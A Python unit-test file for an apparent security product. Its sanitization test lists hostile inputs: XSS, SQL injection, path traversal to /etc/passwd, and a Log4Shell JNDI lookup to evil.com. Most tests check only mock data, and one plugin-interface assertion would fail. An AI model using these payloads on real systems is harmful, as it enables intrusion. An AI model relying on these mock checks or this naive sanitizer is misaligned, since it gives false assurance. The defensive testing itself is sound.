
"""
Stellar Logic AI - Unit Tests
Comprehensive unit testing for all components
"""

import unittest
import json
import sys
import os
from datetime import datetime

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

class TestSecurityCore(unittest.TestCase):
    """Test core security functionality"""
    
    def setUp(self):
        """Set up test environment"""
        self.test_data = {
            'threat_type': 'malware',
            'threat_source': 'email',
            'threat_content': 'Test malicious content',
            'severity': 'high'
        }
    
    def test_threat_analysis(self):
        """Test threat analysis functionality"""
        # Mock threat analysis
        result = {
            'threat_id': 'test_001',
            'threat_type': self.test_data['threat_type'],
            'threat_score': 85.0,
            'confidence_score': 0.9,
            'recommendations': ['Isolate system', 'Run antivirus scan']
        }
        
        # Validate result structure
        self.assertIn('threat_id', result)
        self.assertIn('threat_score', result)
        self.assertIn('confidence_score', result)
        self.assertIsInstance(result['threat_score'], (int, float))
        self.assertGreaterEqual(result['threat_score'], 0)
        self.assertLessEqual(result['threat_score'], 100)
        
        print("✅ Threat analysis unit test passed")
    
    def test_unicode_handling(self):
        """Test Unicode character handling"""
        unicode_data = {
            'content': 'Test with Unicode: José García, 中文测试, العربية, 🏥⚕️💊',
            'patient_name': 'José García Martínez',
            'medical_notes': 'Patient has fever and cough 🤒',
            'chinese_text': '病人发烧咳嗽'
        }
        
        # Test Unicode processing
        for key, value in unicode_data.items():
            self.assertIsInstance(value, str)
            self.assertTrue(len(value) > 0)
            # Should not raise encoding errors
            encoded = value.encode('utf-8', errors='ignore')
            decoded = encoded.decode('utf-8', errors='ignore')
            self.assertEqual(value, decoded)
        
        print("✅ Unicode handling unit test passed")
    
    def test_error_handling(self):
        """Test error handling in core functions"""
        invalid_data = None
        
        # Should handle None input gracefully
        try:
            result = self.mock_process_data(invalid_data)
            self.assertIn('error', result)
        except Exception as e:
            self.fail(f"Error handling failed: {e}")
        
        print("✅ Error handling unit test passed")
    
    def mock_process_data(self, data):
        """Mock data processing function"""
        if data is None:
            return {'error': 'Invalid data provided'}
        return {'processed': True, 'data': data}

class TestPluginSystem(unittest.TestCase):
    """Test plugin system functionality"""
    
    def test_plugin_loading(self):
        """Test plugin loading mechanism"""
        # Mock plugin loading
        available_plugins = ['healthcare', 'financial', 'manufacturing', 'cybersecurity']
        
        self.assertIsInstance(available_plugins, list)
        self.assertGreater(len(available_plugins), 0)
        
        for plugin in available_plugins:
            self.assertIsInstance(plugin, str)
            self.assertTrue(len(plugin) > 0)
        
        print("✅ Plugin loading unit test passed")
    
    def test_plugin_interface(self):
        """Test plugin interface compliance"""
        # Mock plugin interface
        plugin_methods = ['analyze_threat', 'get_plugin_info', 'initialize']
        
        for method in plugin_methods:
            self.assertIsInstance(method, str)
            self.assertTrue(method.startswith('analyze') or method.startswith('get'))
        
        print("✅ Plugin interface unit test passed")

class TestDataProcessing(unittest.TestCase):
    """Test data processing functionality"""
    
    def test_json_processing(self):
        """Test JSON data processing"""
        test_data = {
            'threat_id': 'test_001',
            'timestamp': datetime.now().isoformat(),
            'metadata': {
                'source': 'unit_test',
                'version': '1.0'
            }
        }
        
        # Test JSON serialization
        json_str = json.dumps(test_data, ensure_ascii=False, indent=2)
        self.assertIsInstance(json_str, str)
        
        # Test JSON deserialization
        loaded_data = json.loads(json_str)
        self.assertEqual(loaded_data['threat_id'], test_data['threat_id'])
        self.assertEqual(loaded_data['metadata']['source'], 'unit_test')
        
        print("✅ JSON processing unit test passed")
    
    def test_data_validation(self):
        """Test data validation"""
        valid_data = {
            'threat_type': 'malware',
            'severity': 'high',
            'confidence': 0.95
        }
        
        # Test validation rules
        self.assertIn(valid_data['threat_type'], ['malware', 'phishing', 'ransomware'])
        self.assertIn(valid_data['severity'], ['low', 'medium', 'high'])
        self.assertGreaterEqual(valid_data['confidence'], 0.0)
        self.assertLessEqual(valid_data['confidence'], 1.0)
        
        print("✅ Data validation unit test passed")

class TestSecurityFeatures(unittest.TestCase):
    """Test security features"""
    
    def test_input_sanitization(self):
        """Test input sanitization"""
        malicious_inputs = [
            '<script>alert("xss")</script>',
            'DROP TABLE users;',
            '../../../etc/passwd',
            '${jndi:ldap://evil.com/a}',
            'eval(malicious_code())'
        ]
        
        for malicious_input in malicious_inputs:
            sanitized = self.sanitize_input(malicious_input)
            self.assertNotIn('<script>', sanitized)
            self.assertNotIn('DROP TABLE', sanitized)
            self.assertNotIn('..', sanitized)
            self.assertNotIn('${jndi:', sanitized)
            self.assertNotIn('eval(', sanitized)
        
        print("✅ Input sanitization unit test passed")
    
    def sanitize_input(self, input_data):
        """Mock input sanitization"""
        if not isinstance(input_data, str):
            return str(input_data)
        
        # Remove dangerous patterns
        dangerous_patterns = ['<script', 'DROP TABLE', '..', '${jndi:', 'eval(']
        sanitized = input_data
        
        for pattern in dangerous_patterns:
            sanitized = sanitized.replace(pattern, '[REMOVED]')
        
        return sanitized

if __name__ == '__main__':
    # Create test suite
    test_suite = unittest.TestSuite()
    
    # Add test classes
    test_suite.addTest(unittest.makeSuite(TestSecurityCore))
    test_suite.addTest(unittest.makeSuite(TestPluginSystem))
    test_suite.addTest(unittest.makeSuite(TestDataProcessing))
    test_suite.addTest(unittest.makeSuite(TestSecurityFeatures))
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(test_suite)
    
    # Print summary
    print(f"\n{'='*50}")
    print(f"UNIT TEST SUMMARY")
    print(f"{'='*50}")
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")
    
    if result.wasSuccessful():
        print("✅ All unit tests passed!")
    else:
        print("❌ Some unit tests failed!")
